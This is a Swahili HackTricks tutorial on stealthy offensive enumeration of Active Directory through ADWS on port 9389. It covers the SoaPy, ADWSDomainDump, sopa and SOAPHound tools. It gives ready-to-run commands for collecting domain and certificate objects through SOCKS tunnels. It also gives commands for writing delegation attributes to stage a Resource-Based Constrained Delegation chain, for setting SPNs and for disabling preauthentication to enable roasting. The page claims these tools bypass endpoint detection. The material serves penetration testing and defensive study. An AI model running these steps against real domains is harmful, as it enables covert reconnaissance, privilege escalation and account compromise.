# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS ni nini?

Active Directory Web Services (ADWS) imewekwa kwa chaguo-msingi kwenye kila Domain Controller tangu Windows Server 2008 R2 na husikiliza kwenye TCP **9389**. Licha ya jina, **hakuna HTTP inayohusika**. Badala yake, huduma huonyesha data ya mtindo wa LDAP kupitia safu ya itifaki za kufungasha za .NET za umiliki:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa kuwa trafiki imefungwa ndani ya fremu hizi za SOAP za binary na inasafiri kupitia bandari isiyo ya kawaida, **enumeration kupitia ADWS ina uwezekano mdogo zaidi wa kuchunguzwa, kuchujwa au kuwekwa saini ikilinganishwa na trafiki ya LDAP/389 & 636 ya kawaida**. Kwa waendeshaji hili linamaanisha:

* Stealthier recon – Blue teams mara nyingi hujikita kwenye maswali ya LDAP.
* Uhuru wa kukusanya kutoka kwa **non-Windows hosts (Linux, macOS)** kwa kuhamisha 9389/TCP kupitia SOCKS proxy.
* Data ile ile ungepata kupitia LDAP (users, groups, ACLs, schema, n.k.) na uwezo wa kufanya **writes** (kwa mfano `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa **RBCD**).

Mwingiliano ya ADWS hufanyika juu ya WS-Enumeration: kila swali huanza na ujumbe `Enumerate` unaobainisha LDAP filter/attributes na kurudisha `EnumerationContext` GUID, ikifuatiwa na ujumbe mmoja au zaidi wa `Pull` ambao hutiririsha hadi dirisha la matokeo lililowekwa na seva. Contexts hufifia baada ya takriban dakika 30, hivyo zana zinahitaji kuruka matokeo kwa ukurasa au kugawanya filters (maombi ya prefix kwa kila CN) ili kuepuka kupoteza hali. Unapoomba security descriptors, bainisha udhibiti `LDAP_SERVER_SD_FLAGS_OID` ili kutokuweka SACLs, vinginevyo ADWS itabana tu attribute ya `nTSecurityDescriptor` kutoka kwenye jibu lake la SOAP.

> NOTE: ADWS pia inatumiwa na zana nyingi za RSAT GUI/PowerShell, hivyo trafiki inaweza kuchanganyika na shughuli halali za admin.

## SoaPy – Mteja wa Python (asili)

[SoaPy](https://github.com/logangoins/soapy) ni **utekelezaji kamili upya wa stack ya itifaki ya ADWS katika Python safi**. Inatengeneza fremu za NBFX/NBFSE/NNS/NMF byte kwa byte, ikiruhusu ukusanyaji kutoka mifumo ya aina ya Unix bila kugusa runtime ya .NET.

### Vipengele Vikuu

* Inasaidia **proxying kupitia SOCKS** (utilioweza kutoka kwa C2 implants).
* Filters za utafutaji zilizo na udhibiti mdogo zenye sawa na LDAP `-q '(objectClass=user)'`.
* Hiari za **write** ( `--set` / `--delete` ).
* Mode ya output ya **BOFHound** kwa usomaji wa moja kwa moja kwenye BloodHound.
* Bendera `--parse` kwa kupendeza timestamps / `userAccountControl` wakati utakapotaka usomaji wa kibinadamu.

### Bendera za ukusanyaji zilizolengwa & shughuli za kuandika

SoaPy inakuja na switches zilizorekebishwa zinazorudia kazi za kawaida za utafutaji za LDAP kupitia ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, pamoja na `--query` / `--filter` ghafi kwa pulls za kawaida. Ziunganishe na primitives za kuandika kama `--rbcd <source>` (inaweka `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging kwa Kerberoasting iliyolengwa) na `--asrep` (badilisha `DONT_REQ_PREAUTH` katika `userAccountControl`).

Mfano wa utafutaji wa SPN uliolengwa unaorejesha tu `samAccountName` na `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Tumia host/credentials ile ile ili mara moja weaponise findings: dump RBCD-capable objects with `--rbcds`, kisha tumia `--rbcd 'WEBSRV01$' --account 'FILE01$'` ili kuandaa Resource-Based Constrained Delegation chain (ona [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) kwa njia kamili ya matumizi mabaya).

### Usakinishaji (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Tawi la `ldapdomaindump` ambalo hubadilisha LDAP queries kwa ADWS calls kwenye TCP/9389 ili kupunguza LDAP-signature hits.
* Hufanya ukaguzi wa awali wa ufikikaji kwa 9389 isipokuwa `--force` itakapotumika (huacha probe ikiwa skani za bandari ni noisy/filtered).
* Imethibitishwa dhidi ya Microsoft Defender for Endpoint na CrowdStrike Falcon na bypass iliyofanikiwa katika README.

### Ufungaji
```bash
pipx install .
```
### Usage
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Matokeo ya kawaida yanarekodi ukaguzi wa kufikika wa 9389, ADWS bind, na kuanza/kuisha kwa dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Mteja wa vitendo kwa ADWS kwa Golang

Vivyo hivyo kama soapy, [sopa](https://github.com/Macmod/sopa) inatekeleza staki ya itifaki ya ADWS (MS-NNS + MC-NMF + SOAP) katika Golang, ikitoa bendera za command-line kutuma miito ya ADWS kama:

* **Utafutaji na urejeshaji wa objekti** - `query` / `get`
* **Mzunguko wa maisha ya objekti** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Uhariri wa sifa** - `attr [add|replace|delete]`
* **Usimamizi wa akaunti** - `set-password` / `change-password`
* na mengine kama `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Ukusanyaji wa ADWS wa Kiasi Kikubwa (Windows)

[FabricForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is a .NET collector that keeps all LDAP interactions inside ADWS and emits BloodHound v4-compatible JSON. Inajenga cache kamili ya `objectSid`, `objectGUID`, `distinguishedName` na `objectClass` mara moja (`--buildcache`), kisha inaitumia tena kwa shughuli za kiasi kikubwa za `--bhdump`, `--certdump` (ADCS), au `--dnsdump` (AD-integrated DNS) ili takriban sifa 35 tu muhimu ziache DC. AutoSplit (`--autosplit --threshold <N>`) hutenganisha maswali kwa prefiksi ya CN ili kubaki chini ya timeout ya EnumerationContext ya dakika 30 katika forests kubwa.

Mtiririko wa kazi wa kawaida kwenye VM ya operator iliyounganishwa na domain:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON zilizotolewa zilikuwa zimewekwa moja kwa moja ndani ya SharpHound/BloodHound workflows—angalia [BloodHound methodology](bloodhound.md) kwa mawazo ya kuchora grafu za downstream. AutoSplit hufanya SOAPHound kustahimili kwenye misitu yenye vitu vya mamilioni huku ikidumisha idadi ya queries kuwa chini kuliko snapshots za mtindo wa ADExplorer.

## Mchakato wa Ukusanyaji wa AD wa Stealth

Mchakato ufuatao unaonyesha jinsi ya kuorodhesha **domain & ADCS objects** kupitia ADWS, kuzibadilisha kuwa BloodHound JSON na kuwinda njia za mashambulizi zinazotegemea vyeti – yote kutoka Linux:

1. **Tunnel 9389/TCP** kutoka kwenye target network hadi kwenye mashine yako (kwa mfano via Chisel, Meterpreter, SSH dynamic port‑forward, n.k.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` au tumia SoaPy’s `--proxyHost/--proxyPort`.

2. **Kusanya root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Kusanya vitu vinavyohusiana na ADCS kutoka Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Geuza kuwa BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Pakia ZIP** kwenye GUI ya BloodHound na endesha query za cypher kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua njia za kupandishwa cheo kwa vyeti (ESC1, ESC8, n.k.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Unganisha hili na `s4u2proxy`/`Rubeus /getticket` kwa mnyororo kamili wa **Resource-Based Constrained Delegation** (angalia [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Muhtasari wa Zana

| Purpose | Tool | Notes |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Marejeo

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
